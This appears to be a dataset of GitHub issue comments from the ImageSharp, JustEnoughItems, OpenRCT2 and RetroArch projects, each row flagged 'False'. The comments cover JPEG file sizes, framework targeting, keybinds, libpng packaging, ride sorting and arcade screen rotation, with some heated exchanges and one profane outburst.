ImageSharp/SixLabors/485/371939039,485,We need to deal with nothing. Our operations work well. You STILL haven't described why 1mb is wrong. ,,False
ImageSharp/SixLabors/485/371939450,485,"Because I did not resize . ıt should be the same size  //x.Resize(image.Width / 2, image.Height / 2);  it is only comment ",,False
ImageSharp/SixLabors/485/371939806,485,4.30 MB the source the destination is less than 1mb without resizing ,,False
ImageSharp/SixLabors/485/371940227,485,All that means is you have likely used a better/higher compression ratio than the original source image. Unless the output actually looks wrong to a human eye then it's doing exactly the right thing. ,,False
ImageSharp/SixLabors/485/371941320,485,the output looks exactly like the source. Only the source is 4.30 MB output is something like 800kb The properties of output are similar to the source but the size is different. In 10 min I can share proper code and related images . Give me time please I will be more clear. ,,False
ImageSharp/SixLabors/485/371941648,485,"Then well done you have successfully used imagesharp, and we have saved you alot of space. Your welcome. That's exactly the output imagesharp is trying to accomplish. ",,False
ImageSharp/SixLabors/485/371944685,485,"    public IActionResult OnPost()     {         if (MyFiles.Count &gt; 0)         {             foreach (IFormFile fl in MyFiles)             {                 FileInfo flInfo = new FileInfo(fl.FileName);                 string getExt = flInfo.Extension.ToLower();                 string newFileName = RandomString(5) + getExt;                 string fileSaveUrl = Path.Combine(TempUploadFolderPath, newFileName);                  using (var memoryStream = new MemoryStream())                 {                     fl.CopyTo(memoryStream);                     using (Image&lt;Rgba32&gt; image = Image.Load&lt;Rgba32&gt;(memoryStream.ToArray()))                     {                         image.Mutate(x =&gt;                         {                             image.Save&lt;Rgba32&gt;(fileSaveUrl);                         });                     }                 }              }              return null;         }         else         {             Message = ""File not selected"";         }         return null;     }  ",,False
ImageSharp/SixLabors/485/371944927,485,source image is 2.24 MB otput image is  474KB ,,False
ImageSharp/SixLabors/485/371945930,485,"If I use  IImageEncoder like                         IImageEncoder imageEncoder = new JpegEncoder()                         {                             Quality = 90,                             Subsample = JpegSubsample.Ratio444                         };                          image.Mutate(x =&gt;                         {                             image.Save&lt;Rgba32&gt;(fileSaveUrl, imageEncoder);                         });  ",,False
ImageSharp/SixLabors/485/371946582,485, Images please. Explain please why is this behavior wrong for you? It's a good thing to have smaller files.  ,,False
ImageSharp/SixLabors/485/371947096,485,"source still the same 2.24MB the output image is 1.06MB     better but not similar. I can understand because it passes through jpeg compression but still the difference is big. Still, I think this is the windows issue.  Would be nice to handle. Thank you very much for your patience. I continue to follow you. Have fun ",,False
ImageSharp/SixLabors/485/371948950,485,Consider I bought 1 kg apple in the market at home it becomes 300 gr .) or reverse it at home you produce 1Kg apple when you arrived at the market you have 250 gr to sell... It is ok not much important.  Only sounds a bit not natural. ) ,,False
ImageSharp/SixLabors/485/372017993,485,"I did s simply a joke base on  your answer(--Explain please why is this behavior wrong for you? It's a good thing to have smaller files.)  But still the question is there (--Your input images are probably saved at 100 quality, you're saving at 75 and then 90. This changes the way the quantizer ....) In the code, I have an example which saves the image without defining the quality and in another example with defining the quality. The output is not similar but in both, the output is not the correct size. My purpose is trying to understand your library and use it. Because I have found it brilliant. Also, I have shared the issue  I have faced.  For the purpose to help for improving.  Sorry for the joke. The issue is still there... ",,False
ImageSharp/SixLabors/485/371974103,485,"The difference is staring you in the face. You've clearly demonstrated what affects the output size. Your input images are probably saved at 100 quality, you're saving at 75 and then 90. This changes the way the quantizer within jpeg uses colors and sampling and can cause a massive drop in image size with very little difference in quality. Something you could have easily researched. It's all on Wikipedia for example. Now.... I need you to stop posting here. This is an issue tracker, for real issues not a forum for you to discuss your fantastical ideas. We have clear guidelines which you obviously ignored. If you continue to waste our time you will be blocked. Do you understand? ",,False
ImageSharp/SixLabors/485/372018240,485,"@friend what we are trying to tell you is there is no issue... the library is working as designed you feed it an image (that may or may not have been previously saved in a optimised fashion) you then save it and we do all the optermisation on the image we can to reduce file size (thus we actually reduce the size significantly), unless there is actual issue with the visual output of the image then we have done our jobs very well and there is no issue/bug. As ee are getting no where repeating the fact that saving a file and reducing the size with out effecting the visual quality is a good thing i'm locking this thread. ",,False
ImageSharp/SixLabors/513/310899308,513,"Description When compiling against net451 I get multiple errors that are no present when compiling against netstandard2.0. Steps to Reproduce The following line will error when compiling against net451. System Configuration  ImageSharp version 1.0.0-beta0003 Other ImageSharp packages and versions n/a Environment (Operating system, version and so on) Windows 10 .NET Framework version All Additional information n/a  ",,False
ImageSharp/SixLabors/513/378331965,513,The .NETStandard 1.1 target utilized for NET451 is missing some file APIs that you are trying to use. Are you able to target .NET461? ,,False
ImageSharp/SixLabors/513/378364568,513,"Yeah, that’s not a bug. We also even show in the example code in the readme that the File API overload requires netstandard 1.3+ ",,False
ImageSharp/SixLabors/513/378375121,513,Can you explain why you can't target net451? Usually any code that compiles for netstandard2.0 will also compile against net451! ,,False
ImageSharp/SixLabors/513/378377532,513,.NET 4.5.1 was released in 2013 and is no longer supported by Microsoft.  Is there a reason you are unable to target a higher framework version? ,,False
ImageSharp/SixLabors/513/378427903,513,"@friend just take a stream using  and pass it to . @friend on one hand, I really really want to get rid of NET Standard 1.1, but on the other hand there are so many large enterprises having stupid IT limitations keeping them in the stone age. I really wish we knew how many users do we have amongst such companies. @friend is this your case? 😄 ",,False
ImageSharp/SixLabors/513/378512698,513,"@friend - The reason a lot of projects target net451 as well as netstandard2.0 is that although you need net461 for netstandard2.0 the API surface for net451 is almost identical to netstandard2.0 and in most cases you will be able to target net451 without any code changes. @friend - For me the two required targets would be net451 and netstandard2.0. The net451 target would allow us to keep supporting customers on Windows Server 2008 with extended maintenance. The netstandard2.0 target would be for for new development. @friend - My personal opinion is that .NET Standard versions earlier than 2.0 are at best confusing. Based on the above grid, my suggestion would be to target netstandard2.0, netstandard1.2 and net451. This would not only give multiple targets but the available methods would be based on capability and not the arbitrary .NET Standard versions. ",,False
ImageSharp/SixLabors/513/378514956,513,@friend You do understand with an explicit  target you're asking us to target a brand new library against an obsolete framework with no security updates available? ,,False
ImageSharp/SixLabors/513/378541829,513,"@friend - Targeting net451 will allow better support for .NET 4.5.1, .NET 4.6, Mono 4.6 to 5.2. If you can target net451 I don't see the problem in doing so as the framework choice is down to the package consumers who might have a valid reason for requiring net451 (e.g. Windows Server 2008). ",,False
ImageSharp/SixLabors/513/378553868,513,@friend All of those frameworks are supported by Net Standard 1.1 I think you are failing to understand exactly what a standard is. I suggest you look again at the picture I posted above. You might not see a problem but I most definitely do. Targeting .NET 4.5.1  Adds complexity to the build Can severely limit future development Means that I am now referencing unsupported binaries that may well contain security issues.  And for what? So you can avoid using a FileStream in your consuming code and support an operating system that has another 1 1/2 years of support? There's a sense of entitlement here I am detecting that I find deeply unpleasant. You are asking me to do what a soon to be trillion dollar company will not and cannot do. I'm going to lock this issue now and I suggest you have a good think about your attitude towards open source. ,,False
JustEnoughItems/mezz/1153/299938680,1153,"Not 100% sure but, after looking for 6 minuets in keybinds and options in jei I can't find a hide jei all option only the left panel. The point of this would be your tired of it for a bit and want to remove it or you don't want others to think your cheating in survival. Default keybind""o"" Also keep the boolean public so modders can decide where and when to hide it ",,False
JustEnoughItems/mezz/1153/368265363,1153,JEI doesn't have a left panel. The item list can be hidden with CTRL + O ,,False
JustEnoughItems/mezz/1153/368265558,1153,Ever heard of encapsulation)? ,,False
JustEnoughItems/mezz/1153/368301848,1153,um key bind to hid the right panel control + o hides the left panel when addons are in ,,False
JustEnoughItems/mezz/1153/368337276,1153,Then you should request those addons add their own keybind. They have absolutely nothing to do with JEI. ,,False
JustEnoughItems/mezz/1153/368384129,1153,No because the other addons can't hide jei jei needs to get hidden with a keybind or under specified conditions via boolean visible not the addon pannel ,,False
JustEnoughItems/mezz/1153/368384494,1153,"JEI does not draw on the left side of the screen. JEI's keybind for hiding itself (the right side ingredient list) is Control+O by default, and configurable in the controls menu. If it is not working, or the behavior is changed, it's because some other mod is messing it up. Please find out which and report to them. ",,False
JustEnoughItems/mezz/1153/368384533,1153,Did You read I said right side ,,False
JustEnoughItems/mezz/1153/368384656,1153,I am close to banning you from my issue tracker. Please respond in a less pedantic way. ,,False
JustEnoughItems/mezz/1153/368384673,1153,Keybind o to hide all JEI not just the left pannel that mods add. Your currnet setup in your JEI keybinds that I saw said to hide something and that something with addon was left pannel by itself it did nothing without any addons. ,,False
JustEnoughItems/mezz/1153/368384751,1153,FUCK YOU YOU DON'T FUCKING READ SHIT IT SAYS RIGHT SIDE THE RIGHT JEI PANNEL NOT PATHETIC ,,False
JustEnoughItems/mezz/1153/368385272,1153,"In your original post it says Pedantic does not mean pathetic, look it up. I think you are the one who isn't reading carefully. Goodbye. ",,False
JustEnoughItems/mezz/1153/368385361,1153,"ok well actually this is a seperate issue control + 0 did hide it but, with the addon it wasn't weird maybe if you just told me it does hide the pannel with control + o to the right I wouldn't have been pissed sorry ",,False
JustEnoughItems/mezz/1153/368386320,1153," The very angry comment was deleted but I'm not putting up with that, I've blocked him now. / ",,False
OpenRCT2/OpenRCT2/7186/297243925,7186," OS [Debian Buster] Version [0.1.1] Commit/Build [4601265] ./openrct2 error while loading shared libraries libpng12.so.0 cannot open shared object file No such file or directory  [x] Reproducible in RCT2 (vanilla)? [ ] Multiplayer?  Steps to reproduce  Trying to run it praise  Notes 6697 is known to me and a clutch and not a solution Please, Please use AppImage to be less of an headache for 80 of the Linux Community  be linking to  and calling @friend for help ",,False
OpenRCT2/OpenRCT2/7186/365747676,7186,"There is already  can you please detail what are the differences between the three available formats? Getting it packaged as snap required just a few minutes and a handful of lines in  (which I don't think I have handy right now) and I worked with upstream developers to improve Arch (my distro of choice) support, which was the major roadblock when the issue was filed. Please also take a look at  /  simply not true. Your  may be unable to do that, which is a deficiency of your package manager, but there is nothing stopping users from installing . ",,False
OpenRCT2/OpenRCT2/7186/365750702,7186,"Ubuntu AND Debian (stable) already dropped support for that obsolete version of libPNG solution provide this obsolete version with the software (with appimage, flatpack, snap) or upgrade to the new version that offically replaces it. Again, there is a difference between a ""kludge"" and a ""solution"" ",,False
OpenRCT2/OpenRCT2/7186/365753387,7186,"How about you approach us less aggressively? Do you honestly expect us to help you if you're talking to us like that? In any case, we still compile against libpng12 because of Ubuntu 16.04. That will most likely change when Ubuntu 18.04 comes out. ",,False
OpenRCT2/OpenRCT2/7186/365754485,7186,"i dont see a reason to wait that long, ubuntu 17.10 is out already and dropped support while libpng16 is supported by ubuntu16.04 and up and also Debian ",,False
OpenRCT2/OpenRCT2/7186/365754902,7186,"and sorry for that ""aggressiveness"", i have mental issues and lose myself quickly ",,False
OpenRCT2/OpenRCT2/7186/365755654,7186,"Ok, thanks. ubuntu 17.10 is out already and dropped support while libpng16 is supported by ubuntu16.04 and up and also Debian Our CIs run on 16.04 and non-LTS images are not available. Furthermore, while libpng16 and libpng16-dev are available, attempting to install them means removing libfontconfig1-dev and libfreetype6-dev, both of which we need. ",,False
OpenRCT2/OpenRCT2/7186/365756249,7186,what are the consequences of them being disabled? ,,False
OpenRCT2/OpenRCT2/7186/365756269,7186,"Said Debian user.  libpng 1.6 was first released 2013-02-14 and it only took 4 years for debian to notice  and  don't see what's the sudden rush all about. You're welcome to compile openrct2 on your system and we will properly use libpng 1.6. We will gladly accept any help to improve the situation, which you so kindly offered, but in the meantime I would suggest you tone down your demands a bit, as you come through as overly aggressive. See  for rough idea of how the upgrade of relevant CI jobs to 18.04 is meant to look like (TL;DR switch as soon as it's out) ",,False
OpenRCT2/OpenRCT2/7186/365757398,7186,"yes, want to keep my system clean of kludges, i was forbidden to tinker with it unnecessary ",,False
OpenRCT2/OpenRCT2/7186/365757518,7186,"Well, we can't compile without libfontconfig1-dev and libfreetype6-dev, unless we disable TTF rendering. But since normal builds have TTF rendering on, this is not a good idea - it means bugs can easily go unnoticed. Anyway, openrct2 can be compiled against libpng16, in case you compile stuff yourself. ",,False
OpenRCT2/OpenRCT2/7186/365758039,7186,"i hate compiling, i am not a dev (yet), just an annoyed user that wants to play this game ",,False
OpenRCT2/OpenRCT2/7186/365758436,7186,"Well, we have given you a number of workarounds. It's up to you if you want to use them or not. ",,False
OpenRCT2/OpenRCT2/7186/366066551,7186,"congrats, the android version is playable,  i really hope you make the Linux version easy to use soon ",,False
OpenRCT2/OpenRCT2/7186/366257556,7186,@friend you can try using the packages from launchpad ,,False
OpenRCT2/OpenRCT2/7186/366422068,7186,That's completely not true. ,,False
OpenRCT2/OpenRCT2/7186/366464763,7186,i use wine for it already (which is sad) ,,False
OpenRCT2/OpenRCT2/7186/366470857,7186,Ultimately it's up to you to use the builds we provide. ,,False
OpenRCT2/OpenRCT2/7186/366472167,7186,@friend  how that??? the builds that youn provide dont work ,,False
OpenRCT2/OpenRCT2/7186/365759422,7186,then i would probably try the Android version instead ,,False
OpenRCT2/OpenRCT2/7186/366476498,7186,"This is getting ridiculous. So you try a build done on Ubuntu and file an issue but refuse to try use another build on the grounds ""it is not your OS"" and keep on whining how you refuse to apply the fix… so why did you file the issue in the first place? There are fallacies in your arguments. As I said earlier ",,False
OpenRCT2/OpenRCT2/7186/366438426,7186,"i read that on the Debian Wiki, and i won't corrupt my system because some stranger told me to do... i am an end-user, i want a properly packaged version of this game to be able to play it, like everyone else does that successfully but OpenRCT2 ",,False
OpenRCT2/OpenRCT2/7186/366475829,7186,because your build does not work on my os ,,False
OpenRCT2/OpenRCT2/7186/366335434,7186,"@friend i use Debian, i wrote that in the issue ",,False
OpenRCT2/OpenRCT2/7186/366476926,7186,"@friend we do not support Debian, for Linux distros it is up to the community to provide packages through the package manager of the distro. We do not have the manpower to provide specific builds / maintenance for every distro as they are far too many and they all have their subtle differences. You can either use a supported OS such as Windows or Ubuntu 16.04 or ask someone in the Debian community to provide a package for OpenRCT2. ",,False
OpenRCT2/OpenRCT2/7186/366472597,7186,This discussion is getting pointless. You said yourself you refuse to use the builds we provide ,,False
OpenRCT2/OpenRCT2/7186/366442313,7186,"The obvious solution for you @friend is to run vanilla under wine or a windows VM until OpenRCT2 can be updated since you seem paranoid of contamination. (it's highly unlikely that you would break something by compiling this yourself. And that's why we have backups.) By the way, the second portion of your last post seems cut off. ",,False
OpenRCT2/OpenRCT2/7186/389317462,7186," migrated our Ubuntu docker images from Ubuntu 16.04 to Ubuntu 18.04, our future builds will be using that as a base ",,False
OpenRCT2/OpenRCT2/7365/310209562,7365," **OS** Windows X Sixty Four Bit (laptop) **Commit/Build** AA7FB35    Good evening. The issue I am experiencing concerns a preference pertaining to the sortition of all available attractions and rides. By default, there are entries for each ride as written in RCT2. The Vintage Cars get one slot, the Car Ride gets another, and so on, despite sharing the same track. There is a secondary option, which combines the rides and groups them by track type. This forces the Vintage Cars and Car Ride onto one slot, the Steeplechase and Soapbox Derby rides into one slot, and so on.   [ ] Reproducible in RCT2 (vanilla)? [ ] Specific to multiplayer?  Steps to reproduce     Dump file  Screenshots / Video  Save game  ",,False
OpenRCT2/OpenRCT2/7186/366477282,7186,"Look, we have suggested several options. You have dismissed most of them. That's not helping. And while I'm not completely happy how @friend handled some stuff here, you're not conversing in a very pleasant way either. In any case, this has gone out of hand, so I'll have to lock the conversation. ",,False
OpenRCT2/OpenRCT2/7186/366475321,7186,Why did you report the bug in the first place then? ,,False
OpenRCT2/OpenRCT2/7186/366473629,7186,the ppa builds are made for Ubuntu ,,False
OpenRCT2/OpenRCT2/7365/377677502,7365,"The old sorting made little sense the racing cars, sportscars and trucks were put together, but the cheshire cats and vintage cars were not. In addition, the old approach also restricted access to several track pieces and made it impossible to switch vehicles afterwards. I'm afraid we're not going to revert this decision. The RCT2 mechanism was disliked by a lot of people and supporting both means more complexity. ",,False
OpenRCT2/OpenRCT2/7365/377707618,7365,"Both were supported for a long, LONG time. Continuing that support would require no significant effort. Forcing your will on others who prefer the other system is wrong. I am not asking to change it back or make the correct version the default. I just want to be allowed to choose. I deserve a choice. Playing the game with tracks crushed together is very difficult for me, because I can't remember what I've selected or where. Not everyone plays the way you do. I deserve a choice, and I am sure the others who use the default system would be mad as well. Railroading your personal preferences on others is a mistake. ",,False
OpenRCT2/OpenRCT2/7365/377710246,7365,"You can always just play with an older version if it's that much trouble, can't you?  I've seen them implementing their own object files and stuff lately and so I would guess that maybe since they're doing that it's changing how the codebase works and it would take extra effort to support both methods going forward. ",,False
OpenRCT2/OpenRCT2/7365/377710370,7365,"You already made your choice to use OpenRCT2 instead of vanilla RCT2. You've gotten used to the way vanilla RCT2 handles things, OpenRCT2 changed it (and not just because it can be changed), and then you complain that it has. You can always use an older build from before, or play vanilla instead. By all means, feel free to fork this project and revert the commit that changed the behaviour, then play with your own build. So there are plenty of choices you can make. ",,False
OpenRCT2/OpenRCT2/7365/377707710,7365,"This mechanism was liked by a lot of people, too, given it was the way we played it for about twenty years! You can maintain choice, and the choice was already implemented! It's a matter of not wanting to. ",,False
RetroArch/libretro/8551/480553748,8551,some arcades have the monitor rotated 90 degrees. The  can the emulator can either rotate the image to the displays orientation or display it as intended and you rotated your display 90 degrees ,,False
RetroArch/libretro/8551/430055555,8551,"Description With vertically oriented games, Retroarch switches the emulator-provided width and height. For example, if the width/height is supposed to be 320x240, RA will switch this to 240x320. This only occurs with vertically oriented games. I tested this in both MAME and FBA using the Windows 64 bit version of RA. Expected behavior The game to be displayed using the correct resolution (width/height). Actual behavior The height and width is switched when a vertically oriented game is loaded. Steps to reproduce the bug  load any vertically oriented game in either FBA or MAME using Windows 64 bit version of RA. under video settings, enable integer scale.  set ""custom aspect ratio width/height"" to 1x. look at ""custom aspect ratio width/height"" to see that it says 240 for width and 320 for height. This is the reverse of what it should be.   Bisect Results I first noticed this a few days ago. Version/Commit You can find this information under Information/System Information  RetroArch 1.7.6 Git version 9750719074  Environment information  OS Windows 10  Compiler NA    ",,False
OpenRCT2/OpenRCT2/7365/377727079,7365,"@friend That, combined with the fact that the current system had matured enough, is indeed the reason we removed it. We created a new object format and we weren't going to support all of RCT2's cruft. @friend Oh, of course, you know this better than someone who actually maintains the software. If it would require no significant effort, then please do what @friend suggested and maintain your own fork with this feature put back in. Prove that I have no idea what I'm talking about if it's this easy. Hell, if you know better than we do, why don't you just go ahead and fix some of the bugs we have a hard time fixing? Why do you deserve a choice? How much did you pay for OpenRCT2? How much do I get paid for working on it? You have an awfully big mouth for someone who got all of this for free, especially considering I am investing a lot of spare time into this without any financial gain. You have no reason to demand we put this feature back, and especially not with the tone you're using. You don't have to like our decisions, you can discuss it with us, but the very least you could do is to treat us normally. I wouldn't tolerate this if this were a paid game and I got a salary from it, so I'm certainly not going to tolerate in these circumstances. ",,False
RetroArch/libretro/8551/480587874,8551,"I understand that, but the emulator-provided resolution should not be changed from the correct resolution, regardless of orientation. If the game is 320x240 it should be output as 320x240, not 240x320. The user can flip it or rotate it or resize it or whatever, but the output resolution from the emulator should remain the same (eg, 320x240 should be output as 320x240 before the user does stuff to it). Otherwise you get scaling artifacts unless you just happen to adjust the y axis to a multiple of both 240 and 320 (eg, 960). And if you’re playing a game that uses a weird resolution like 19XX (384x240), then it causes big problems with overscan or underscan when using integer scaling. As of right now, video aspect ratio for vertical games must be configured manually (custom ratio width/height, non-integer) along with custom ratio x/y position, because the resolution/ratio for vertical games isn’t being detected correctly. ",,False
RetroArch/libretro/8551/480592063,8551,the thing is the topic say the width and height are switched they simply arent it just a rotated monitor. It draws the image on the monitor as 43 then you flip the monitor physically this changes it to 34 on real hardware as far as the hardware is concerned its a normal 43 device but your rendering the image 90 degrees rotated. In mame2003 or plus just use tate mode this stop the rotation and you need to flip your monitor like a real one. look at sf2 this is on a 43 screen look at the resolution of the game it use crt timing when rendering to look the way it does in a crt if you used the literal resolution for sf2 the gfx would be overly stretched. ,,False
RetroArch/libretro/8551/480592631,8551,it looks like your talking about capcom games watch this to understand whats going on and it is indeed 43 ,,False
RetroArch/libretro/8551/480595131,8551,"I’m not referring exclusively to capcom games. You can see this behavior in the example screenshots I posted above, which are from Donpachi. I understand very well that certain games are meant to be displayed vertically. This doesn’t change anything that I’ve said. With a vertically-oriented 320x240 game, width should say 320 and height should say 240, and the displayed image should be sideways. On a 43 CRT monitor the image would be 320x240 and sideways. You then rotate the monitor 90 degrees. This doesn’t change the image to 240x320. It is still 320x240 but now it is rotated 90 degrees so it is no longer sideways. Altering the internal resolution of the game is incorrect, and will always result in scaling artifacts unless you happen to use a resolution that is a multiple of both 320 and 240. ",,False
RetroArch/libretro/8551/480595698,8551,If you display the arcade pcb to a CRT monitor in normal orientation it will be a 320x240 image that is sideways. You rotate the CRT 90 degrees. The resolution of the game remains unchanged. ,,False
RetroArch/libretro/8551/480596063,8551,yes resolution of you display remains unchanged. I dont have a crt to test whats going on there I would assume you should be using core provided information and tate mode on for mame2003 and plus dont know if the others support tate mode ,,False
RetroArch/libretro/8551/480596550,8551,You just aren’t getting what I’m saying. I’m going to have to post some screenshots later to help illustrate what’s going on currently and what should be going on instead. ,,False
RetroArch/libretro/8551/480596681,8551,can you make them screenshot in mame2003 and 2003+ with tate mode on so i can see what going on make sure your using core provided for aspect ratio as well in them screenshots will help a lot in seeing whats going on ,,False
RetroArch/libretro/8551/480611617,8551,"First of all, just look at the first two screenshots I posted above. See where it says ""custom aspect ratio width"" and ""custom aspect ratio height""  Both of these screenshots were taken with video rotation disabled. Width/height should be the reverse of what is shown in the above screenshots. ",,False
RetroArch/libretro/8551/480611698,8551,"Here is what it SHOULD look like with video rotation disabled. This is what is NOT happening, currently. I created this in GIMP by manually switching the height/width in GIMP.  ",,False
RetroArch/libretro/8551/480612022,8551,Here is what currently happens. Both of these are incorrect. video rotation disabled  video rotation enabled  ,,False
RetroArch/libretro/8551/480612380,8551,"Next, here are some tests conducted by HunterK. See how video height/width are switched from what it is in my screenshots in the very first post? That's what it should be.    ",,False
RetroArch/libretro/8551/480612418,8551,what emulator is this from here is screenshots from with ? ,,False
RetroArch/libretro/8551/480612765,8551,"Next, I made this shot by manually resizing the resolution to 1600x1200, and used a scanlines shader. Notice how the scanlines and mask are perfectly scaled with no scaling artifacts present. This could only be the case if the game's resolution is indeed 320x240. With the currently reported resolution of 240x320, you get scaling artifacts.  ",,False
RetroArch/libretro/8551/480612817,8551,"I already said what emulator is being used in my initial post. The behavior is present in both MAME and FBA in the Windows 64 bit version of RA. As you can see in the tests conducted by HunterK, this behavior is not present in the Linux version of RA. ",,False
RetroArch/libretro/8551/480612964,8551,this is mame2003 with tate mode on and off using core provided aspect ratio I cant speak for the other emulators   ,,False
RetroArch/libretro/8551/480613114,8551,....How is this helpful? ,,False
RetroArch/libretro/8551/480613279,8551,have you even tried running mame2003 with these settings it what it shoud do tate mode skips the rotating and renders like its should. ,,False
RetroArch/libretro/8551/480613300,8551,"How are we supposed to know what the core reported width and height are from the screenshots you just posted? Again, the issue is that the emulator reported height and width are not correct. ",,False
RetroArch/libretro/8551/480613632,8551,Tate mode ON solves the issue in MAME 2003. Tate mode off  Tate mode on  ,,False
RetroArch/libretro/8551/480613938,8551,i think mame current has rotation options in the tab menu dont know if they will work as expected though ,,False
RetroArch/libretro/8551/480613968,8551,"The problem is, tate mode ON in MAME 2003 should be the default for all emulators including FBA. This is what the image looks like when you connect the actual hardware to a CRT that isn't rotated. There shouldn't be any automatic switching for vertical-oriented games. Switching height/width (Tate mode off) should be something that the user has to select because it's altering the original output of the emulated hardware. Anything done to alter the original output of the emulated hardware in this way should be something that the user has to manually select. Still no idea how HunterK was able to get the image to to display correctly using FBA, and I'm still unable to get the other version of MAME to display the image correctly. ",,False
RetroArch/libretro/8551/480614499,8551,sure that can be true im sure most people dont have there displays rotated unless they have a barcade of some sort setup for vertical games only. Its  a personal opinion but feel free to post an issue on it is easy enough to change the defaults through issues in the emulators in question. I dont really feel strongly about this its one for the people in charge of the repos it switchable in mame2003 and plus anyway in the options so the default wont really matter it can be changed to suit your display ,,False
RetroArch/libretro/8551/480614871,8551,"I'm not just being pedantic, here. The width/height being switched isn't helpful and causes numerous potential issues. With the current behavior of height/width being automatically switched with vertical games, you still have to rotate the image if you want correct aspect ratio and orientation or to avoid a huge amount of letterboxing, and with height/width being switched like this, it results in scaling artifacts unless you happen to choose a resolution that is a multiple of both 320 and 240. Furthermore, there is still no way that I know of to get any emulator besides MAME 2003 to work correctly. The current rationale of ""people don't want to rotate their displays"" just isn't sufficient to justify this. ",,False
RetroArch/libretro/8551/480616075,8551,first of all i completely agree with you all options should be clear to change and i feel fba does cover this option well its just you have to restart for it to take effect/ ill need to look into mame current at a later time. I will tell you how to to fix fba got quick menu options turn vertical mode on and restart the emulator it should work as expected. ,,False
RetroArch/libretro/8551/480618244,8551,"In FBA, enabling vertical mode in the quick menu options and restarting the emulator does not fix the problem. I'm still getting this  ",,False
RetroArch/libretro/8551/480618472,8551,"Another problem related to this is the sheer number of knobs and dials related to video rotation. There are options related to video rotation in all of these places main menu -&gt;quick menu -&gt; options settings -&gt; video settings -&gt; core If I'm an average user, how am I supposed to know what to do with all of this? Even as an experienced user, this is quite confusing. ",,False
RetroArch/libretro/8551/480619132,8551,"SUCCESS. Actually, in FBA I have to turn vertical mode OFF under quick menu -&gt; options.  So, yes, there is a lot going on here. Each of the cores seems to be handling this in a different way and there are far too many knobs and dials related to this. Disabling vertical mode makes it work in FBA, while enabling tate mode in MAME 2003 makes it work there... how does that make any sense?! As things currently stand, the options for this are an incoherent mess. Even you thought that enabling vertical mode would be the same as enabling tate mode, which makes sense, intuitively. There just seems to be no rhyme or reason to the way these settings currently work. ",,False
RetroArch/libretro/8551/480620589,8551,"I'm still getting the same problem in FBA 2012. There is no option in quick menu -&gt; options for vertical mode. Under settings -&gt; core there is an option for ""enable rotation."" I'm getting the same results with this turned either ON or OFF. settings -&gt; core -&gt; allow rotation ON  settings -&gt; core -&gt; allow rotation OFF  ",,False
RetroArch/libretro/8551/480622042,8551,"as far as I can tell, the problem is the frontend based rotation not taking into account the aspect ratio change. I don't think we need so many knobs in the cores to do this, it should be one option in the frontend and that's all. I'm not even sure why there is a ROTATION ENV callback in the API ",,False
RetroArch/libretro/8551/480628910,8551,there is a reason for it to be there clearly this isint a front end issue. It cant guess if you have rotated you monitor 90 degrees physically you need to deal with this as a core option if that is the case. ,,False
RetroArch/libretro/8551/480628956,8551,"Agree w/fr500. In my opinion, a vertically-oriented game should look like this by default  The user can then rotate the image using the advanced user option under settings -&gt; video -&gt; rotation You could also add an option under video settings (""automatically rotate vertical games 90 degrees"" or something) to automatically set settings -&gt; video -&gt; rotation -&gt; 90 degrees whenever a vertical oriented game is detected. But, I'm getting ahead of myself. ",,False
RetroArch/libretro/8551/480629221,8551,"You're missing the larger issue which is that the emulator isn't always using the correct resolution. The resolution/aspect ratio should remain unchanged regardless of rotation- see above. A vertical game that is 320x240 should be output as 320x240. The frontend option for video rotation is more than sufficient and solves the problems related to the way things are currently handled, which are, to wit  it's incorrect according to what the original hardware does it's counter-intuitive  it results in scaling artifacts with integer scaling  ",,False
RetroArch/libretro/8551/480630056,8551,and how is the front end supposed to guess that this particular arcade is rotated or not mame2003 covers this i dont see how you can get the front end to be psychic ,,False
RetroArch/libretro/8551/480630788,8551,"I'm saying that the front end options are sufficient and that the cores are currently doing something wrong/there's too much going on with the cores. Just make the cores output the original resolution, unaltered, and let the user use the frontend options for rotation and aspect ratio. That would solve the problem(s). In standalone FBA, you get this by default, which is as it should be  With ""Video -&gt; rotate vertically aligned games -&gt; enabled"" you get this, which is again as it should be  ",,False
RetroArch/libretro/8551/480631219,8551,ok with you so far you failing to mention the users monitors physical orientation in all this ,,False
RetroArch/libretro/8551/480631512,8551,"I don't see why the monitor orientation is relevant to what resolution the core is outputting. Altering the height/width of the resolution so that the image is correctly oriented on a non-rotated monitor is altering the output resolution, and thus incorrect. The core should just output the unaltered resolution. Altering the resolution, aspect ratio or video rotation is all stuff that should happen on the frontend or through a user option that has to be selected. ",,False
RetroArch/libretro/8551/480632602,8551,"Also, as we can see, there's just a lot of weird stuff going on. TATE mode ON in MAME results in the same behavior as vertical mode OFF in FBA, and FBA 2012 won't display a correct image no matter what settings are applied, and I haven't even tested all the emulators yet. I understand the lack of standardization when it comes to core options, but this just seems somewhat ridiculous. ",,False
RetroArch/libretro/8551/480632982,8551,im trying to understand where you are hitting this from the cores arent scaling the resolution RA scaless the resolution to your display. ,,False
RetroArch/libretro/8551/480633397,8551,To what are you referring with this statement? ,,False
RetroArch/libretro/8551/480633538,8551,"If the front end can't detect whether a game is vertical or not, then it's the cores that are automatically switching the height/width for vertical games. ",,False
RetroArch/libretro/8551/480634732,8551,yes they do people that dont rotate there monitors dont want to play there vertical games sideways or rotate there monitor by default.  Tate mode wont rotated vertical games at all on mame2003 that what you requested. ,,False
RetroArch/libretro/8551/480635529,8551,"This whole discussion is pointless. There is not need to guess anything, this is software development, there is an API, an implementation, and a frontend. There is an API for this  the players are  core api frontend  Who knows the content needs rotation? The core does. The environment callback is a set, which means it's telling the frontend to ""do something"" So what should happen could go two ways a. The core tells the frontend ""hey video is rotated, adjust aspect ratio from what I reported accordingly"" b. The core tells the frontend ""hey this content requires rotation, do whatever you need to do so it works properly"" That's all. This is a frontend problem, but before anything can be do about it what we need is clarification from the API side so we can adjust both the frontend and the cores to do whatever needs to be done. That's all. ",,False
RetroArch/libretro/8551/480640219,8551,there is no front end issue some arcades have different rotations not just 90 degrees. The core needs to work this out the user will need to be more specific from what he says he wants vertical games to display like this by default  which is perfectly valid if you have a rotated monitor.  this is how it displays when you dont have a rotated monitor the user seems to think this is wrong  ,,False
RetroArch/libretro/8551/480641025,8551,"Ok, you win, have fun arguing forever instead of proposing a solution. ",,False
RetroArch/libretro/8551/480641314,8551,Ok you have a 43 monitor it draws as 43 like the fist picture you rotate it the monitor in the arcade 90 degrees what aspect ratio is it now for us to display on out normal monitor sitting on the tv stand? ill leave you two to it ,,False
